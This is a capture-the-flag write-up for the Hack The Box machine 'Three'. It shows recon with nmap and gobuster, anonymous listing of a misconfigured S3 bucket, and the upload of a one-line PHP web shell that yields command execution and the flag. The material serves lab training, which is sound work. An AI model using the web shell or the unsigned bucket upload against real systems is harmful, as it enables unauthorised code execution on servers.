# HTB Starting Point – Three 

> Difficulty: Very Easy  
> OS: Linux  
> Focus: Cloud misconfiguration, AWS S3, file upload → RCE

---

 Overview

"Three" is a beginner-friendly Hack The Box machine that teaches how poor cloud storage configurations (S3 buckets) can lead to remote code execution.

The machine includes:
- A main domain (`thetoppers.htb`)
- A hidden subdomain (`s3.thetoppers.htb`)
- An AWS S3-backed web server
- A vulnerable PHP setup that lets us upload and execute code

---

 Recon

 Nmap Scan

```bash
nmap -sV -p- 10.129.227.248

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4
80/tcp open  http    Apache httpd 2.4.29
 /etc/hosts

10.129.227.248 thetoppers.htb
Web Enumeration
Visiting http://thetoppers.htb shows a static concert-themed page.

Viewing the HTML reveals an email domain @thetoppers.htb, suggesting a real vhost.

Subdomain Discovery

gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
Found:

Copy
Edit
s3.thetoppers.htb
Update /etc/hosts:


10.129.227.248 s3.thetoppers.htb
 AWS S3 Bucket Interaction
Installed:

sudo apt install awscli
Setup (using fake creds — not validated):

aws configure
 List available buckets:

aws s3 ls --endpoint-url http://s3.thetoppers.htb --no-sign-request
Found:

Copy
Edit
thetoppers.htb
 List contents:

aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb --no-sign-request
Found:

index.php
.htaccess
images/
 Exploitation – Web Shell Upload
 Created webshell:
php

<?php system($_GET["cmd"]); ?>

echo '<?php system($_GET["cmd"]); ?>' > shell.php
Uploaded to S3:

aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb --no-sign-request
✅ It got written into the web root.

 Code Execution
Tested shell:

curl "http://thetoppers.htb/shell.php?cmd=id"
Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)
🎯 Flag Capture
Tried:

curl "http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt"
Flag retrieved without needing privilege escalation.

proof of pwn - https://labs.hackthebox.com/achievement/machine/2424577/489

✅ Takeaways
Misconfigured AWS S3 buckets can lead to full webroot control.

Even basic PHP shells are powerful in a file-write scenario.

This machine reinforces cloud + web + file upload exploitation.
